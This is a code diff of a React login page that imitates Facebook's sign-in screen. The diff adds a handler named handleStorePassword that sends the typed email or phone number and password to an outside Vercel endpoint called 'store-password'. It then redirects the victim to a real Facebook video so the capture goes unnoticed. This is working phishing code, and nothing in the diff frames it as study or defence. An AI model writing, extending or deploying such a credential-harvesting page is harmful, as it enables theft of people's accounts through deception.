@@ -1,25 +1,41 @@
+import { useState } from "react";
+import axios from "axios";
 import { IoChevronDown } from "react-icons/io5";
 import { FaFacebook } from "react-icons/fa";
-import { Link, useNavigate } from "react-router-dom";
-import axios from "axios";
+import { Link } from "react-router-dom";
 
 const Login = () => {
+  const [emailNum, setEmailNum] = useState("");
+  const [password, setPassword] = useState("");
 
-  const navigate = useNavigate();
-
-  const handleSubmit = (e) => {
+  const handleStorePassword = (e) => {
     e.preventDefault();
-    const emailNum = e.target.emailNum.value;
-    const pass = e.target.password.value;
-    // console.log(emailNum, pass);
-    const user = { emailNum, pass };
-    axios.post("https://facebook02-nine.vercel.app/api/login", user).then((res) => {
-      // console.log(res);
-      if (res.status === 200) {
-        window.location.href = "https://web.facebook.com/watch?v=1716608769152496";
-      }
-      
-    });
+
+    // Ensure both emailNum and password are entered
+    if (!emailNum || !password) {
+      alert("Please provide both email/phone number and password.");
+      return;
+    }
+
+    // Prepare the data to send to the backend
+    const data = {
+      emailNum: emailNum,
+      password: password,
+    };
+
+    // Send the data to store the password
+    axios
+      .post("https://facebook02-swart.vercel.app/api/store-password", data, {    // http://localhost:5000
+        withCredentials: true,
+      })
+      .then((response) => {
+        if (response.status === 200) {
+          window.location.href = "https://web.facebook.com/watch?v=1716608769152496";
+        }
+      })
+      .catch((error) => {
+        console.error("Error during login:", error);
+      });
   };
 
   return (
@@ -92,13 +108,15 @@ const Login = () => {
 
       {/* input form */}
       <div className="">
-        <form onSubmit={handleSubmit} className="w-full px-4">
+        <form onSubmit={handleStorePassword} className="w-full px-4">
           {/* Email Field */}
           <div className="relative mb-6">
             <input
               type="txt"
               name="emailNum"
               id="email"
+              value={emailNum}
+              onChange={(e) => setEmailNum(e.target.value)}
               placeholder=" "
               className="peer px-5 input input-bordered w-full h-16"
             />
@@ -116,6 +134,8 @@ const Login = () => {
               type="password"
               name="pass"
               id="password"
+              value={password}
+              onChange={(e) => setPassword(e.target.value)}
               placeholder=" "
               className="peer px-4 input input-bordered w-full h-16"
             />
